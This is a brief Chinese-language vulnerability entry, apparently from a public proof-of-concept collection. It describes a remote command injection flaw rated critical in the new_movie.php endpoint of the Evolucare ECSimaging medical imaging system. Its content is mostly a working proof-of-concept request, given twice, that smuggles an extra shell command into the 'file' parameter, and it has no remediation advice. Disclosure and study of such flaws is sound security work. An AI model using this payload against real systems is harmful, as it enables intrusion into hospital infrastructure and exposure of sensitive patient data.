# Evolucare Ecsimaging new_movie.php 远程命令执行漏洞

## 漏洞描述
EVOLUCARE ECSimage是一款国外使用的医疗管理系统，研究发现其new_movie.php接口中存在命令注入漏洞,攻击者可利用该漏洞获取系统敏感信息等.

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录页面

![](images/202205241447357.png)

验证POC

```
/new_movie.php?studyUID=1&start=2&end=2&file=1;pwd
```


## Payloads
```
/new_movie.php?studyUID=1&start=2&end=2&file=1;pwd
```
